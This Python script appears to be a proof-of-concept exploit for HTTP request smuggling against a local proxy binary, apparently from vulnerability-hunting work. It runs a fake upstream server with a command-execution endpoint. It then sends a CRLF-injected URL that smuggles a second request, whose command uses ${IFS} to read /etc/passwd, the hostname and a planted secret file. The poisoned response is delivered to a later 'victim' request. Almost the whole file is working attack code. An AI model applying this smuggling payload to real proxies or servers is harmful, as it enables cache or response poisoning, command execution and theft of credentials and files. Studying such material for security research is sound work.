import socket, threading, time, os, sys, subprocess, urllib.parse, re
ROOT='/tmp/toksec-hunt'; BIN=ROOT+'/s5o3'; CFG=ROOT+'/cfg5single'
CP=18451; UP=18471
log=[]; lock=threading.Lock(); stop=False

srv=socket.socket(); srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
srv.bind(('127.0.0.1',UP)); srv.listen(8); srv.settimeout(0.2)

def sp_run(cmd):
    return subprocess.run(['/bin/sh','-c',cmd],capture_output=True,timeout=3).stdout

def handle(c):
    buf=b''; n=0
    try:
        c.settimeout(6)
        while not stop:
            while b'\r\n\r\n' not in buf:
                d=c.recv(65536)
                if not d: return
                buf+=d
            e=buf.index(b'\r\n\r\n'); head=buf[:e]; buf=buf[e+4:]
            n+=1
            with lock: log.append(head.decode('latin1','replace'))
            if n==1:
                c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nCLEAN')
            elif b'/exec' in head:
                m=re.search(rb'GET /exec\?cmd=([^ \r\n]+)', head)
                cmd=urllib.parse.unquote(m.group(1).decode()) if m else 'id'
                try:
                    out=sp_run(cmd)
                except Exception as ex:
                    out=repr(ex).encode()
                b=b'EXEC:'+out
                time.sleep(0.3)
                c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n'%len(b)+b)
            else:
                time.sleep(0.15)
                c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 6\r\n\r\nLATER!')
    except Exception: pass
    finally:
        try: c.close()
        except: pass
def loop():
    while not stop:
        try: c,_=srv.accept()
        except socket.timeout: continue
        except OSError: break
        threading.Thread(target=handle,args=(c,),daemon=True).start()
threading.Thread(target=loop,daemon=True).start()

open('/tmp/toksec-hunt/secret-test.txt','w').write('TOPSECRET-OUTSIDE-ROOT\n')
env=dict(os.environ)
p=subprocess.Popen([BIN,'--config',CFG],stdout=open(ROOT+'/rce.log','wb'),stderr=subprocess.STDOUT,env=env)
time.sleep(0.6)

def req(t,wait=2.5):
    s=socket.create_connection(('127.0.0.1',CP),2); s.settimeout(wait)
    s.sendall(b'GET '+t+b' HTTP/1.1\r\nHost: alpha.test\r\n\r\n')
    buf=b''
    try:
        while True:
            d=s.recv(65536)
            if not d: break
            buf+=d
            if b'\r\n\r\n' in buf:
                h,b=buf.split(b'\r\n\r\n',1); cl=0
                for ln in h.split(b'\r\n')[1:]:
                    if ln.lower().startswith(b'content-length:'): cl=int(ln.split(b':',1)[1])
                if len(b)>=cl: break
    except socket.timeout: pass
    s.close(); return buf

cmd=urllib.parse.quote('head${IFS}-2${IFS}/etc/passwd;echo${IFS}---;hostname;echo${IFS}---;cat${IFS}/tmp/toksec-hunt/secret-test.txt',safe='')
ATTACK=(b'/%70roxy/x%0D%0AHost:%20up%0D%0A%0D%0A'
        + ('GET%20/exec%3Fcmd%3D'+cmd+'%20HTTP/1.1%0D%0AHost:%20up%0D%0AX-Pad:%20').encode())
print('ATTACKER ->', req(ATTACK))
time.sleep(1.2)
v=req(b'/proxy/victim')
print('VICTIM   ->', v)
print()
with lock:
    print('--- upstream request heads ---')
    for i,t in enumerate(log,1): print(' %d: %r'%(i,t))
stop=True; p.terminate(); time.sleep(0.2)
try: p.kill()
except: pass
try: srv.close()
except: pass
print('--- srvlog ---'); print(open(ROOT+'/rce.log','rb').read()[:400].decode('latin1','replace'))
